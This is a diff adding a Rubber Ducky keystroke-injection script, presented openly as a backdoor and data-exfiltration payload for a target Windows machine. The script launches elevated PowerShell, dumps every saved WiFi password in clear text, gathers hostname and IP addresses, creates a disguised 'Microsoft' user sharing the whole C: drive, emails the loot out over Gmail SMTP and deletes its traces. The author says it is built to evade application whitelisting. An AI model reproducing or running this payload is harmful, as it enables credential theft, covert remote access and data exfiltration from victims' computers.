@@ -1,0 +1,79 @@
+This simple script will grab all of the wifi passwords, external IP address, LAN address, and hostname of the target device and e-mail it to an address of your choice. I recommend you use a Gmail address for this. I have not had luck with Yahoo, Hotmail, etc...
+
+It then creates a user called Microsoft, and shares C:\ out to the new user. My goal here was to use one liners to prevent this from being picked up by whitelisting applications (no .bat, .exe, etc...)
+ 
+```
+REM # Backdoor - Data Exfiltration
+REM # Credit goes to Crumb93 and BrainEater from the Hak5 forums for the Wifi Password one liner
+DELAY 1000
+WINDOWS d
+DELAY 450
+WINDOWS r
+DELAY 450
+STRING powershell Start-Process powershell -Verb runAs
+DELAY 30
+ENTER
+DELAY 500
+ALT y
+DELAY 1000
+REM *****************
+REM # We're going to grab all wifi passwords
+REM *****************
+STRING (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize > C:\Information.txt
+ENTER
+DELAY 500
+REM *****************
+REM # Now we'll grab Network Information (Local IP, Public IP, Hostname)
+REM *****************
+STRING $command = {hostname; Get-NetIpaddress | Where PrefixOrigin -EQ DHCP; Invoke-RestMethod http://ipinfo.io/json | Select -exp ip}
+ENTER
+DELAY 60
+STRING $command.InvokeReturnAsIs() | Out-File C:\Information.txt -Append
+ENTER
+DELAY 400
+REM *****************
+REM # We're going to add a user
+REM *****************
+STRING NET USER Microsoft "l33t" /ADD
+ENTER
+DELAY 100
+REM *****************
+REM # Now we're going to share the C:\ drive out
+REM *****************
+STRING New-SmbShare -Name "Microsoft" -Path "C:\" -FullAccess "Microsoft"
+ENTER
+DELAY 100
+REM *****************
+REM # Let's e-mail ourselves and clean up
+REM *****************
+DELAY 1000
+STRING $SMTPServer = 'raircom8@gmail.com'
+ENTER
+STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+ENTER
+STRING $SMTPInfo.EnableSSL = $true
+ENTER
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('EMAILHERE', 'PASSWORDHERE!')
+ENTER
+STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
+ENTER
+STRING $ReportEmail.From = 'EMAILHERE'
+ENTER
+STRING $ReportEmail.To.Add('EMAILHERE')
+ENTER
+STRING $ReportEmail.Subject = 'Hello from the duck'
+ENTER
+STRING $ReportEmail.Body = (Get-Content C:\Information.txt | out-string)
+ENTER
+STRING $SMTPInfo.Send($ReportEmail)
+ENTER
+DELAY 100
+REM *****************
+REM # Cleanup
+REM *****************
+STRING del C:\Information.txt
+ENTER
+STRING exit
+ENTER
+```
+https://github.com/Crumb93
